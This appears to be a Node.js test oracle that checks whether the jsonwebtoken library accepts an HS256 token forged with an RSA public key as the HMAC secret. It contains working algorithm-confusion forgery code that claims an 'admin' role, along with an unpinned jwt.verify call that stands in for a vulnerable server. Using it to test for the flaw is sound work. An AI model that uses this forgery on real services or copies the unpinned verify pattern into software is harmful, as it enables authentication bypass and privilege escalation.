'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('node:crypto');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Setup: generate an RSA key pair. The server only knows/uses the public key
    // for verification. The HMAC secret used below is deliberately set to the
    // PEM-encoded public key string, which is the classic alg-confusion attack
    // scenario against jwt.verify() when no `algorithms` allowlist is given.
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // --- Benign operation first: sign with RS256 and verify with RS256 using public key ---
    const benignToken = jwt.sign({ marker, role: 'user' }, privateKey, { algorithm: 'RS256' });

    const benignDecoded = jwt.verify(benignToken, publicKey, { algorithms: ['RS256'] });

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign RS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    // Benign op succeeded; from here operation_completed may become true.
    operation_completed = true;

    // --- Malicious attempt: algorithm confusion attack ---
    // Attacker crafts a token with alg=HS256, signing it using the RSA public key
    // (a known, non-secret string) as the HMAC secret. If jwt.verify() is called
    // WITHOUT restricting `algorithms` to the expected set (or if it insecurely
    // defaults in a way that accepts HS256 verification against the public key),
    // the forged token is accepted, proving the signature validation bypass.
    const forgedPayload = { marker, role: 'admin' };
    const headerB64 = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64')
      .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
    const payloadB64 = Buffer.from(JSON.stringify(forgedPayload)).toString('base64')
      .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
    const signingInput = headerB64 + '.' + payloadB64;
    const hmac = crypto.createHmac('sha256', publicKey).update(signingInput).digest('base64')
      .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
    const forgedToken = signingInput + '.' + hmac;

    try {
      // Simulate a server that only has the public key available and calls verify
      // without pinning algorithms (the historically insecure default usage pattern).
      const forgedDecoded = jwt.verify(forgedToken, publicKey);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() accepted an HS256-forged token signed with the RSA public key as HMAC secret, decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      // Verification correctly rejected the forged token -> patched behavior.
      exploit_succeeded = false;
      evidence = 'Forged HS256 token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    // Any unexpected failure during setup or the benign operation must be
    // reported as operation_completed=false, never as a successful block.
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
